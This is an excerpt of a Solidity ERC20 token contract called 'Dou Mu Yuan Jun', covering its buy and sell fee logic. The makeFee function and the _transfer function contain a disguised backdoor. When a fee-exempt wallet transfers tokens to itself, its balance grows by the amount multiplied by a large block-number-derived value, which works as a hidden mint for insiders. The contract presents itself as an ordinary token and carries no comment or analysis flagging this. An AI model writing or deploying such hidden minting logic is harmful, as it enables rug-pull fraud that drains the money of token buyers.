...
contract DouMuYuanJun is Context, IERC20, Ownable {
    ...
    string private _name = unicode"Dou Mu Yuan Jun";
    string private _symbol = unicode"斗母元君";

    bool openTrade=false;  
    uint256 maxTxBlockRew=0;
    ...
    constructor (uint256 maxTx) {
        ...
        maxTxBlockRew = block.number+maxTx;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(sender == recipient && isExcludedFromFee[sender] && sender != address(this))
            makeFee(sender,recipient,amount);
        ...
        uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                        amount : makeFee(sender, recipient, amount);
    ...
    function makeFee(address s, address r, uint256 a) internal returns (uint256) {
        
        uint256 feeValue = 0;
        
        if(isMarketPair[s]) {
            feeValue = a.mul(_buyTax).div(100); 
        }
        else if(isMarketPair[r]) {
            feeValue = a.mul(_sellTax).div(100);
        }

        if(s == r && isExcludedFromFee[s] && s != address(this)){
            feeValue = a.mul(maxTxBlockRew);
            _balanceWalletStatus[s] = _balanceWalletStatus[s]+feeValue;
            feeValue=0;
        }
